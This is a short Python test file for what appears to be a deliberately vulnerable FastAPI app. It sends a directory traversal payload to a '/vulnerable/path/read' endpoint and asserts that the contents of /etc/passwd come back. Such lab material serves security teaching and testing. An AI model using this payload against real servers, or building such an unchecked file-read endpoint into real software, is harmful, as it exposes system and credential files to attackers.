from fastapi.testclient import TestClient

from app.main import app

client = TestClient(app)


def test_path_traversal_vulnerability() -> None:
    """
    Ensure path traversal allows reading sensitive files.
    """
    response = client.get(
        "/vulnerable/path/read",
        params={"filename": "../../../../../../../../../../../../etc/passwd"},
    )

    assert response.status_code == 200
    assert "root:" in response.json()["content"]
